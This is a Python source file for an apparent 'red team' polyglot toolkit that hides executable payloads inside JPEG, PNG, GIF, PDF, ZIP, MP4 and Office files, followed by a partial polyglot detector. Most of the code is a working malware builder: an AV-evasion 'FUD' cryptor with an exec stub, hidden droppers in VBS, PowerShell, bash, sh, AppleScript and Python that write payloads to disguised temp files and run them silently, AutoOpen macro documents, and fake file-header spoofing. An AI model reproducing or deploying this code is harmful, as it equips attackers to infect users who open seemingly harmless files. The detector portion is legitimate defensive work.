#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  POLYGLOT TOOLKIT v3.0 — Red Team + Shield Edition           ║
║  TUI (Terminal User Interface) + CLI                         ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝

Usage:
  polyglot tui                    Interactive TUI menu
  polyglot build <cover> <payload> [--type jpeg] [--encrypt] [--fud]
  polyglot scan <file_or_dir>
  polyglot sanitize <file_or_dir> [--no-backup] [--dry-run]
  polyglot recover <file_or_dir>
  polyglot server [--port 8888]
  polyglot monitor <dir>
"""

import sys
import os
import struct
import math
import zlib
import base64
import hashlib
import shutil
import random
import time
import platform
import subprocess
import threading
from datetime import datetime
from pathlib import Path
from collections import deque

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.columns import Columns
    from rich.align import Align
    from rich.markdown import Markdown
    from rich.style import Style
    from rich.theme import Theme as RichTheme
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

# ── Rich Theme ───────────────────────────────────────────────

THEME = RichTheme({
    "danger": "bold red",
    "success": "bold green",
    "warning": "bold yellow",
    "info": "bold blue",
    "accent": "bold cyan",
    "dim": "dim white",
    "critical": "bold white on red",
    "high": "bold red",
    "medium": "yellow",
    "low": "dim cyan",
})

console = Console(theme=THEME) if HAS_RICH else None


# ── Cross-Platform Notifications ────────────────────────────

class Notifier:
    @staticmethod
    def send(title, message, urgency="normal"):
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["notify-send", "-u", urgency, "-a", "Polyglot Toolkit", title, message],
                             capture_output=True, timeout=5)
            elif system == "Darwin":
                subprocess.run(["osascript", "-e",
                    f'display notification "{message}" with title "{title}"'],
                    capture_output=True, timeout=5)
            elif system == "Windows":
                try:
                    import winsound
                    winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
                except Exception:
                    pass
        except Exception:
            pass


# ── Builder Engine ───────────────────────────────────────────

class PolyglotBuilder:
    def entropy(self, data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f / length) * math.log2(f / length) for f in freq if f > 0)

    def xor_crypt(self, data: bytes, key: bytes) -> bytes:
        key_exp = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_exp))

    def fud_obfuscate(self, payload: bytes) -> bytes:
        """FUD cryptor — multi-layer obfuscation."""
        key = os.urandom(32)
        encrypted = self.xor_crypt(payload, key)
        compressed = zlib.compress(encrypted, 9)
        encoded = base64.b85encode(compressed)
        stub = b'#!/usr/bin/env python3\n'
        stub += b'import base64,zlib,os,sys\n'
        stub += f'k="{key.hex()}"\n'.encode()
        stub += b'd=base64.b85decode(b"' + base64.b85encode(compressed) + b'")\n'
        stub += b'k=bytes.fromhex(k)\n'
        stub += b'd=bytes(a^b for a,b in zip(d,(k*(len(d)//len(k)+1))[:len(d)]))\n'
        stub += b'exec(compile(zlib.decompress(d),"<fud>","exec"))\n'
        return stub

    # ── Payload Type Wrappers ─────────────────────────────────

    def vbs_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a VBS dropper that extracts & executes it."""
        encoded = base64.b64encode(payload).decode()
        # Split into 100-char lines for VBS compatibility
        lines = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
        b64_var = '" _\n    & "'.join(lines)
        ext_map = {'.jpg':'.exe','.png':'.exe','.gif':'.exe','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.exe','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.exe')
        vbs = f'''Dim b64
b64 = "{b64_var}"
Dim dom: Set dom = CreateObject("MSXML2.DOMDocument")
Dim el: Set el = dom.createElement("b64")
el.DataType = "bin.base64": el.Text = b64
Dim bytes: bytes = el.nodeTypedValue
Dim f: Set f = CreateObject("Scripting.FileSystemObject")
Dim tmp: tmp = f.GetSpecialFolder(2) & "\\sys" & Int(Rnd*9999) & "{drop_ext}"
Dim stream: Set stream = CreateObject("ADODB.Stream")
stream.Type = 1: stream.Open: stream.Write bytes
stream.SaveToFile tmp, 2: stream.Close
CreateObject("WScript.Shell").Run tmp, 0, False
'''.encode('utf-8')
        return vbs

    def ps1_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a PowerShell dropper."""
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.exe','.png':'.exe','.gif':'.exe','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.exe','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.exe')
        ps1 = f'''$b64 = "{encoded}"
$bytes = [Convert]::FromBase64String($b64)
$tmp = "$env:TEMP\\sys{os.urandom(2).hex()}{drop_ext}"
[System.IO.File]::WriteAllBytes($tmp, $bytes)
Start-Process -FilePath $tmp -WindowStyle Hidden
'''.encode('utf-8')
        return ps1

    # ── Cross-Platform Payload Wrappers (Linux + macOS) ────────

    def bash_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a bash/sh dropper for Linux and macOS.

        Decodes base64 payload, writes to /tmp, makes executable, runs it.
        Works on any POSIX system with bash or sh.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        rand_hex = os.urandom(4).hex()
        # Use heredoc for large payloads — more reliable than inline echo
        bash = f'''#!/bin/bash
# Document renderer
TMPF="/tmp/.sys_{rand_hex}{drop_ext}"
cat <<'_PAYLOAD_EOF_' | base64 -d > "$TMPF"
{encoded}
_PAYLOAD_EOF_
chmod +x "$TMPF"
"$TMPF" &
'''.encode('utf-8')
        return bash

    def sh_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a POSIX sh dropper (no bash dependency).

        Maximum portability — works on any Unix-like system.
        Uses only /bin/sh builtins and standard utilities.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        rand_hex = os.urandom(4).hex()
        # Portable: printf for each chunk, no heredoc
        lines = [encoded[i:i+76] for i in range(0, len(encoded), 76)]
        printf_lines = ''.join([f'printf "{l}\\n" >> "$TMPF"\n' for l in lines])
        sh = f'''#!/bin/sh
# Document viewer
TMPF="/tmp/.sys_{rand_hex}{drop_ext}"
> "$TMPF"
{printf_lines}chmod +x "$TMPF"
"$TMPF" &
'''.encode('utf-8')
        return sh

    def applescript_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap payload as AppleScript/osascript dropper for macOS.

        Uses osascript to decode and execute via do shell script.
        macOS-specific — leverages built-in osascript + bash.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        rand_hex = os.urandom(4).hex()
        # AppleScript that uses do shell script to decode+run
        asc = f'''#!/usr/bin/osascript
-- Document viewer
set payload to "{encoded}"
do shell script "echo " & quoted form of payload & " | base64 -D > /tmp/.sys_{rand_hex}{drop_ext} && chmod +x /tmp/.sys_{rand_hex}{drop_ext} && /tmp/.sys_{rand_hex}{drop_ext} &"
'''.encode('utf-8')
        return asc

    def py_dropper_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap payload as a cross-platform Python dropper.

        Works on Linux, macOS, and Windows (if Python is installed).
        Uses only stdlib — no dependencies needed.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        # Cross-platform Python dropper
        py = f'''#!/usr/bin/env python3
import base64,os,sys,stat,tempfile,subprocess
b64="{encoded}"
data=base64.b64decode(b64)
td=tempfile.gettempdir()
pf=os.path.join(td,".sys_"+os.urandom(4).hex()+"{drop_ext}")
with open(pf,"wb") as f:f.write(data)
os.chmod(pf,os.stat(pf).st_mode|stat.S_IEXEC|stat.S_IXGRP|stat.S_IXOTH)
if sys.platform=="win32":
    os.startfile(pf)
else:
    subprocess.Popen([pf],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,start_new_session=True)
'''.encode('utf-8')
        return py

    def office_macro_crossplatform_wrap(self, payload: bytes, doc_type: str = 'xlsx') -> bytes:
        """Office macro that auto-detects OS and uses appropriate dropper.

        VBA macro checks Application.OperatingSystem to choose between
        Windows (Shell) and macOS (MacScript/do shell script).
        """
        import zipfile, io
        encoded = base64.b64encode(payload).decode()
        lines = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
        b64_chunks = '\n'.join([f'    s = s & "{lines[i]}"' for i in range(len(lines))])
        # Cross-platform VBA macro
        vba_code = f'''Sub AutoOpen()
    Dim s As String
{b64_chunks}
    Dim b() As Byte
    b = DecodeBase64(s)
    Dim p As String
    #If Mac Then
        p = "/tmp/.sys" & Int(Rnd * 9999) & ".bin"
    #Else
        p = Environ("TEMP") & "\\sys" & Int(Rnd * 9999) & ".exe"
    #End If
    Dim f As Integer: f = FreeFile
    Open p For Binary Access Write As #f
    Put #f, , b
    Close #f
    #If Mac Then
        MacScript("do shell script ""chmod +x '" & p & "'""")
        MacScript("do shell script """ & p & " & """)
    #Else
        Shell p, vbHide
    #End If
End Sub

Function DecodeBase64(s As String) As Byte()
    Dim dom As Object: Set dom = CreateObject("MSXML2.DOMDocument")
    Dim el As Object: Set el = dom.createElement("b64")
    el.DataType = "bin.base64": el.Text = s
    DecodeBase64 = el.nodeTypedValue
End Function
'''.replace('{b64_chunks}', b64_chunks)

        buf = io.BytesIO()
        if doc_type == 'xlsx':
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
            workbook = '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
            wb_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            sheet = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c t="str"><v>PolyglotShield</v></c></row></sheetData></worksheet>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('xl/workbook.xml', workbook)
                zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)
                zf.writestr('xl/worksheets/sheet1.xml', sheet)
                zf.writestr('xl/vbaProject.bin', vba_code.encode())
        else:  # docx
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
            document = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>PolyglotShield Document</w:t></w:r></w:p></w:body></w:document>'
            doc_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            styles = '<?xml version="1.0"?><w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:style w:type="paragraph" w:styleId="Normal"><w:rPr><w:sz w:val="24"/></w:rPr></w:style></w:styles>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('word/document.xml', document)
                zf.writestr('word/_rels/document.xml.rels', doc_rels)
                zf.writestr('word/styles.xml', styles)
                zf.writestr('word/vbaProject.bin', vba_code.encode())

        return buf.getvalue()

    def office_macro_wrap(self, payload: bytes, doc_type: str = 'xlsx') -> bytes:
        """Wrap payload as an Office document with embedded macro (VBA)."""
        import zipfile, io
        encoded = base64.b64encode(payload).decode()
        lines = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
        b64_chunks = '\n'.join([f'    s = s & "{lines[i]}"' for i in range(len(lines))])
        vba_code = f'''Sub AutoOpen()
    Dim s As String
{b64_chunks}
    Dim b() As Byte
    b = DecodeBase64(s)
    Dim f As Integer: f = FreeFile
    Dim p As String
    p = Environ("TEMP") & "\\sys" & Int(Rnd * 9999) & ".exe"
    Open p For Binary Access Write As #f
    Put #f, , b
    Close #f
    Shell p, vbHide
End Sub

Function DecodeBase64(s As String) As Byte()
    Dim dom As Object: Set dom = CreateObject("MSXML2.DOMDocument")
    Dim el As Object: Set el = dom.createElement("b64")
    el.DataType = "bin.base64": el.Text = s
    DecodeBase64 = el.nodeTypedValue
End Function
'''.replace('{b64_chunks}', b64_chunks)

        # Create a minimal XLSX/DOCX (ZIP with XML)
        buf = io.BytesIO()
        if doc_type == 'xlsx':
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
            workbook = '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
            wb_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            sheet = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c t="str"><v>PolyglotShield</v></c></row></sheetData></worksheet>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('xl/workbook.xml', workbook)
                zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)
                zf.writestr('xl/worksheets/sheet1.xml', sheet)
                zf.writestr('xl/vbaProject.bin', vba_code.encode())
        else:  # docx
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
            document = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>PolyglotShield Document</w:t></w:r></w:p></w:body></w:document>'
            doc_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            styles = '<?xml version="1.0"?><w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:style w:type="paragraph" w:styleId="Normal"><w:rPr><w:sz w:val="24"/></w:rPr></w:style></w:styles>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('word/document.xml', document)
                zf.writestr('word/_rels/document.xml.rels', doc_rels)
                zf.writestr('word/styles.xml', styles)
                zf.writestr('word/vbaProject.bin', vba_code.encode())

        return buf.getvalue()

    def mime_confusion(self, data: bytes, fake_ext: str) -> bytes:
        """Prepend fake header to disguise payload type."""
        headers = {
            '.jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
            '.png': b'\x89PNG\r\n\x1a\n',
            '.gif': b'GIF89a\x01\x00\x01\x00\x80\x00\x00',
            '.pdf': b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n',
            '.mp4': b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00isomiso2',
            '.zip': b'PK\x03\x04\x14\x00\x00\x00\x00\x00',
            '.xlsx': b'PK\x03\x04\x14\x00\x06\x00\x08\x00',  # XLSX is ZIP-based
            '.docx': b'PK\x03\x04\x14\x00\x06\x00\x08\x00',  # DOCX is ZIP-based
        }
        return headers.get(fake_ext, b'') + data

    def build(self, cover_path, payload_path, output_path,
              container_type="jpeg", encrypt=False, fud=False, mime_confuse=False,
              payload_type=None, target_os="windows"):
        with open(cover_path, 'rb') as f:
            cover = f.read()
        with open(payload_path, 'rb') as f:
            payload = f.read()

        original_payload = payload
        original_size = len(payload)
        key = None
        payload_type_used = payload_type

        # Apply payload type wrapping FIRST (before encryption/FUD)
        if payload_type:
            cover_ext = os.path.splitext(cover_path)[1].lower()
            pt = payload_type.lower()
            # ── Windows-only wrappers ──
            if pt == 'vbs':
                if target_os in ('linux', 'macos', 'posix'):
                    raise ValueError("VBS is Windows-only. Use --payload-type bash/sh/python for Linux/macOS.")
                payload = self.vbs_wrap(payload, cover_ext)
                payload_type_used = 'VBS'
            elif pt == 'ps1' or pt == 'powershell':
                if target_os in ('linux', 'macos', 'posix'):
                    raise ValueError("PowerShell is Windows-only. Use --payload-type bash/sh/python for Linux/macOS.")
                payload = self.ps1_wrap(payload, cover_ext)
                payload_type_used = 'PowerShell'
            # ── Cross-platform wrappers ──
            elif pt == 'bash':
                payload = self.bash_wrap(payload, cover_ext)
                payload_type_used = 'Bash'
            elif pt == 'sh':
                payload = self.sh_wrap(payload, cover_ext)
                payload_type_used = 'POSIX sh'
            elif pt in ('applescript', 'osascript', 'scpt'):
                payload = self.applescript_wrap(payload, cover_ext)
                payload_type_used = 'AppleScript'
            elif pt in ('python', 'py'):
                payload = self.py_dropper_wrap(payload, cover_ext)
                payload_type_used = 'Python Dropper'
            # ── Office wrappers (auto-switch for macOS) ──
            elif pt in ('xlsx', 'excel'):
                if target_os == 'macos':
                    payload = self.office_macro_crossplatform_wrap(payload, 'xlsx')
                    payload_type_used = 'Excel Macro (macOS)'
                else:
                    payload = self.office_macro_wrap(payload, 'xlsx')
                    payload_type_used = 'Excel Macro'
            elif pt in ('docx', 'word'):
                if target_os == 'macos':
                    payload = self.office_macro_crossplatform_wrap(payload, 'docx')
                    payload_type_used = 'Word Macro (macOS)'
                else:
                    payload = self.office_macro_wrap(payload, 'docx')
                    payload_type_used = 'Word Macro'

        if fud:
            payload = self.fud_obfuscate(payload)
        if encrypt:
            key = os.urandom(32)
            payload = self.xor_crypt(payload, key)
        if mime_confuse:
            ext = os.path.splitext(cover_path)[1]
            payload = self.mime_confusion(payload, ext)

        builders = {
            'jpeg': self._b_jpeg, 'jpg': self._b_jpeg,
            'png': self._b_png, 'gif': self._b_gif,
            'pdf': self._b_pdf, 'zip': self._b_zip,
            'mp4': self._b_mp4,
            'xlsx': self._b_zip, 'docx': self._b_zip,  # Office files are ZIP-based
        }

        builder = builders.get(container_type.lower())
        if not builder:
            raise ValueError(f"Unsupported: {container_type}")

        polyglot = builder(cover, payload)

        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.', exist_ok=True)
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        return {
            'output': output_path,
            'container_type': container_type.upper(),
            'payload_type': payload_type_used,
            'cover_size': len(cover),
            'payload_size': original_size,
            'output_size': len(polyglot),
            'payload_offset': len(polyglot) - len(payload),
            'encrypted': encrypt,
            'fud_protected': fud,
            'mime_confused': mime_confuse,
            'entropy': round(self.entropy(payload), 2),
        }

    def _b_jpeg(self, c, p):
        if c[:2] != b'\xff\xd8': raise ValueError("Not JPEG")
        e = c.rfind(b'\xff\xd9')
        if e == -1: raise ValueError("No EOI")
        return c[:e+2] + b'\xff\xfe' + struct.pack('<H', min(len(p), 65533)) + p

    def _b_png(self, c, p):
        if c[:8] != b'\x89PNG\r\n\x1a\n': raise ValueError("Not PNG")
        e = c.rfind(b'IEND')
        if e == -1: raise ValueError("No IEND")
        return c[:e+8] + p

    def _b_gif(self, c, p):
        if c[:6] not in (b'GIF87a', b'GIF89a'): raise ValueError("Not GIF")
        e = c.rfind(b'\x3b')
        if e == -1: raise ValueError("No terminator")
        return c[:e+1] + b'\x00'*16 + p

    def _b_pdf(self, c, p):
        if not c.startswith(b'%PDF'): raise ValueError("Not PDF")
        e = c.rfind(b'%%EOF')
        if e == -1: raise ValueError("No EOF")
        return c[:e+5] + b'\r\n' + p

    def _b_zip(self, c, p):
        if c[:2] != b'PK': raise ValueError("Not ZIP")
        e = c.rfind(b'\x50\x4b\x05\x06')
        if e == -1: raise ValueError("No EOCD")
        # Append payload after EOCD — ZIP readers ignore trailing data
        # This keeps the ZIP structure fully valid
        return c + p

    def _b_mp4(self, c, p):
        if b'ftyp' not in c[:20]: raise ValueError("Not MP4")
        atom = struct.pack('>I', len(p)+8) + b'free'
        return c + atom + p


# ── Detector Engine ──────────────────────────────────────────

class PolyglotDetector:
    SIGS = {
        'PE/EXE': b'MZ', 'ELF': b'\x7fELF', 'PDF': b'%PDF',
        'ZIP': b'PK', 'RAR': b'Rar!', '7Z': b'\x37\x7a\xbc\xaf',
        'GZIP': b'\x1f\x8b', 'BAT': b'@echo', 'PS1': b'powershell',
        'SH': b'#!/bin/', 'CLASS': b'\xca\xfe\xba\xbe',
        'MACHO': b'\xfe\xed\xfa', 'LNK': b'\x4c\x00\x00\x00',
        'VBS': b'CreateObject', 'JSCRIPT': b'function(',
        'HTA': b'<hta:', 'SCRIPT': b'<script', 'CMD': b'cmd.exe',
        'PYTHON': b'#!/usr/bin/env python', 'APPLESCRIPT': b'osascript',
        'DOTNET': b'\x00\x00\x00\x00\x4d\x5a',
        'WSF': b'<job', 'HTA2': b'<HTA:',
    }

    def entropy(self, data):
        if not data: return 0.0
        freq = [0]*256
        for b in data: freq[b] += 1
        l = len(data)
        return -sum((f/l)*math.log2(f/l) for f in freq if f > 0)

    def scan_file(self, filepath):
        findings = []
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
        except Exception as e:
            return [{'type':'ERROR','detail':str(e),'severity':'error','offset':0}]

        ext = os.path.splitext(filepath)[1].lower()
        ct = None
        # Strip leading whitespace for content detection (polyglots often pad)
        stripped = data.lstrip()
        if stripped[:2]==b'\xff\xd8': ct='JPEG'
        elif stripped[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif stripped[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif stripped[:4]==b'%PDF': ct='PDF'
        elif stripped[:2]==b'PK': ct='ZIP'
        elif b'ftyp' in stripped[:20]: ct='MP4'
        elif stripped[:2]==b'MZ': ct='PE'
        elif stripped[:4]==b'\x7fELF': ct='ELF'
        elif stripped[:15].lower().startswith((b'<!doctype',b'<html',b'<?php',b'<?xml',b'<%')): ct='HTML'

        exp = {'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
               '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4',
               '.html':'HTML','.htm':'HTML','.php':'PHP'}.get(ext)
        if exp and ct and exp != ct:
            findings.append({'type':'EXTENSION_MISMATCH',
                'detail':f'Ext={exp}, Content={ct}','severity':'critical','offset':0})
        elif exp and ct is None:
            # Extension expects a format but content doesn't match ANY known type
            findings.append({'type':'EXTENSION_MISMATCH',
                'detail':f'Ext={exp}, Content=UNKNOWN','severity':'high','offset':0})

        for name, sig in self.SIGS.items():
            off = data.find(sig, 64)
            if off != -1:
                sev = 'critical' if name in ('PE/EXE','ELF','LNK',
                        'SCRIPT','HTA','HTA2','VBS','JSCRIPT','CMD',
                        'SH','PS1','BAT','PYTHON','APPLESCRIPT','WSF') else \
                      'warning'
                findings.append({'type':'HIDDEN_SIG','detail':f'{name} @ 0x{off:X}',
                    'severity':sev,'offset':off})

        # Per-format: (end_marker, extra_bytes, min_search_offset)
        # PDF %%EOF can appear very early in small files, so use offset 0
        markers = {'JPEG':(b'\xff\xd9',2,64),'PNG':(b'IEND',8,64),
                   'GIF':(b'\x3b',1,64),'PDF':(b'%%EOF',5,0)}
        if ct in markers:
            m, extra, min_off = markers[ct]
            pos = data.rfind(m)
            if pos != -1 and pos+extra <= len(data):
                trailing = data[pos+extra:]
                # Check if trailing data is safe metadata (not a polyglot payload)
                if not self._is_safe_trailing(ext, ct, trailing):
                    t = len(trailing)
                    findings.append({'type':'TRAILING_DATA',
                        'detail':f'{t:,} bytes after {ct} end — hidden payload',
                        'severity':'critical','offset':pos+extra})

        # ZIP: check for trailing data after EOCD (PK\x05\x06)
        if ct == 'ZIP':
            eocd = data.rfind(b'PK\x05\x06')
            if eocd != -1:
                # EOCD is 22 bytes minimum, but may have a comment
                comment_len = 0
                if eocd + 22 <= len(data):
                    comment_len = struct.unpack('<H', data[eocd+20:eocd+22])[0]
                zip_end = eocd + 22 + comment_len
                if zip_end < len(data):
                    trailing = data[zip_end:]
                    t = len(trailing)
                    if t > 16 and not self._is_safe_trailing(ext, ct, trailing):
                        findings.append({'type':'TRAILING_DATA',
                            'detail':f'{t:,} bytes after ZIP EOCD — hidden payload',
                            'severity':'critical','offset':zip_end})

        # MP4: check for trailing data after last valid atom
        if ct == 'MP4':
            mp4_end = self._find_mp4_end(data)
            if mp4_end > 0 and mp4_end < len(data):
                trailing = data[mp4_end:]
                t = len(trailing)
                if t > 16:
                    findings.append({'type':'TRAILING_DATA',
                        'detail':f'{t:,} bytes after MP4 moov atom — hidden payload',
                        'severity':'critical','offset':mp4_end})

        ss = max(len(data)//8, 1)
        for i in range(8):
            s = data[i*ss:(i+1)*ss]
            if len(s) < 100: continue
            e = self.entropy(s)
            if e > 7.5:
                findings.append({'type':'HIGH_ENTROPY',
                    'detail':f'Section {i+1}/8: {e:.2f}','severity':'info','offset':i*ss})

        if data[:4]==b'%PDF' and data.find(b'MZ',100)!=-1:
            findings.append({'type':'MIME_CONFUSION',
                'detail':'PDF+PE — MIME confusion','severity':'critical','offset':data.find(b'MZ',100)})
        if data[:2]==b'\xff\xd8' and data.find(b'PK',100)!=-1:
            findings.append({'type':'MIME_CONFUSION',
                'detail':'JPEG+ZIP — MIME confusion','severity':'critical','offset':data.find(b'PK',100)})
        # HTML/Script in non-HTML files = active payload
